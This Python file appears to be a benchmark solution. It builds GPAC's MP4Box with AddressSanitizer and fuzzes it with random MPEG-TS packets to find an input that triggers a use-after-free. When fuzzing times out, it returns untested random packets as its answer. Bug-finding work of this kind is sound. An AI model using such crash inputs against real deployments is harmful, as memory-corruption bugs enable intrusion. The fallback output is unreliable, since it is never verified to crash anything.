import os
import sys
import tarfile
import tempfile
import subprocess
import random
import time
import multiprocessing
import queue
import signal
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and build with ASan
        build_dir, binary_path = self.build_with_asan(src_path)
        
        # Fuzz to find crash
        poc = self.fuzz_for_crash(binary_path)
        
        # Cleanup
        shutil.rmtree(build_dir, ignore_errors=True)
        
        return poc
    
    def build_with_asan(self, src_path):
        """Extract source and build with AddressSanitizer"""
        temp_dir = tempfile.mkdtemp(prefix='poc_build_')
        extract_dir = os.path.join(temp_dir, 'src')
        
        # Extract tarball
        with tarfile.open(src_path, 'r:gz') as tf:
            tf.extractall(extract_dir)
        
        # Find source root (usually one directory inside)
        src_root = extract_dir
        entries = os.listdir(extract_dir)
        if len(entries) == 1:
            src_root = os.path.join(extract_dir, entries[0])
        
        build_dir = os.path.join(temp_dir, 'build')
        os.makedirs(build_dir, exist_ok=True)
        
        # Configure and build
        os.chdir(build_dir)
        
        # Set ASan environment
        env = os.environ.copy()
        env['CC'] = 'gcc'
        env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer -g'
        env['LDFLAGS'] = '-fsanitize=address'
        
        # Try to find and build the target
        # Look for MP4Box or similar binary
        binary_path = None
        
        # Check for configure script
        configure_path = os.path.join(src_root, 'configure')
        if os.path.exists(configure_path):
            # Autotools build
            subprocess.run([configure_path, '--enable-debug'], 
                          env=env, check=True, capture_output=True)
            subprocess.run(['make', '-j8'], env=env, check=True, capture_output=True)
            
            # Look for MP4Box
            for root, dirs, files in os.walk(build_dir):
                if 'MP4Box' in files:
                    binary_path = os.path.join(root, 'MP4Box')
                    break
        
        # If not found, try different approach
        if not binary_path:
            # Look for existing test binaries
            test_dir = os.path.join(src_root, 'bin', 'gpac')
            if os.path.exists(test_dir):
                for f in os.listdir(test_dir):
                    if f.startswith('MP4Box'):
                        binary_path = os.path.join(test_dir, f)
                        break
        
        if not binary_path:
            raise RuntimeError("Could not find target binary")
        
        return temp_dir, binary_path
    
    def fuzz_for_crash(self, binary_path):
        """Fuzz the binary to find crashing input"""
        manager = multiprocessing.Manager()
        result_queue = manager.Queue()
        stop_event = manager.Event()
        
        # Create worker processes
        num_workers = 8
        pool = multiprocessing.Pool(num_workers)
        
        # Start workers
        for i in range(num_workers):
            pool.apply_async(self.fuzz_worker, 
                           args=(binary_path, i, result_queue, stop_event))
        
        # Wait for result or timeout
        start_time = time.time()
        timeout = 30  # seconds
        result = None
        
        try:
            while time.time() - start_time < timeout:
                try:
                    result = result_queue.get(timeout=1)
                    if result:
                        stop_event.set()
                        break
                except queue.Empty:
                    continue
        finally:
            pool.close()
            pool.terminate()
            pool.join()
        
        if result:
            return result
        
        # Fallback: return a valid TS packet structure
        return self.generate_ts_packet()
    
    def fuzz_worker(self, binary_path, worker_id, result_queue, stop_event):
        """Worker function for fuzzing"""
        random.seed(worker_id + int(time.time()))
        
        while not stop_event.is_set():
            # Generate test input of target length
            test_data = self.generate_test_input()
            
            # Test the input
            if self.test_input(binary_path, test_data):
                result_queue.put(test_data)
                return
        
        return None
    
    def generate_test_input(self):
        """Generate test input focusing on MPEG-TS structure"""
        # MPEG-TS packets are 188 bytes
        # Generate 6 packets (1128 bytes)
        packets = []
        
        for i in range(6):
            packet = bytearray(188)
            
            # Sync byte
            packet[0] = 0x47
            
            # PID - vary between packets
            packet[1] = random.randint(0, 31)  # Lower bits of PID
            packet[2] = random.randint(0, 255)  # Upper bits of PID
            
            # Adaptation field control and continuity counter
            packet[3] = random.randint(0, 15)
            
            # Fill payload with random data
            for j in range(4, 188):
                packet[j] = random.randint(0, 255)
            
            packets.append(bytes(packet))
        
        return b''.join(packets)
    
    def generate_ts_packet(self):
        """Generate a valid MPEG-TS packet structure"""
        # Create packets that might trigger the bug
        packets = []
        
        # First packet: PAT (PID 0)
        pat_packet = bytearray(188)
        pat_packet[0] = 0x47  # Sync byte
        pat_packet[1] = 0x40  # PID 0, payload unit start
        pat_packet[2] = 0x00
        pat_packet[3] = 0x10  # No adaptation, continuity 0
        # Simple PAT content
        pat_packet[4] = 0x00  # Pointer field
        pat_packet[5] = 0x00  # Table ID
        pat_packet[6] = 0xB0  # Section length high
        pat_packet[7] = 0x0D  # Section length low
        # Rest random
        for i in range(8, 188):
            pat_packet[i] = random.randint(0, 255)
        packets.append(bytes(pat_packet))
        
        # Remaining packets: mix of PIDs
        for i in range(1, 6):
            packet = bytearray(188)
            packet[0] = 0x47
            packet[1] = (i * 100) & 0x1F  # Various PIDs
            packet[2] = ((i * 100) >> 8) & 0xFF
            packet[3] = 0x10  # No adaptation, continuity 0
            # Fill with data that might trigger ES deletion
            for j in range(4, 188):
                packet[j] = random.randint(0, 255)
            packets.append(bytes(packet))
        
        return b''.join(packets)
    
    def test_input(self, binary_path, test_data):
        """Test if input causes crash"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.ts') as f:
            f.write(test_data)
            f.flush()
            
            try:
                # Run with timeout
                result = subprocess.run(
                    [binary_path, '-info', f.name],
                    capture_output=True,
                    timeout=2,
                    env={**os.environ, 'ASAN_OPTIONS': 'exitcode=1'}
                )
                
                # Check for crash (non-zero exit with ASan)
                if result.returncode != 0:
                    # Check for ASan error messages
                    stderr = result.stderr.decode('utf-8', errors='ignore')
                    if 'AddressSanitizer' in stderr and 'use-after-free' in stderr:
                        return True
                    
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
        
        return False
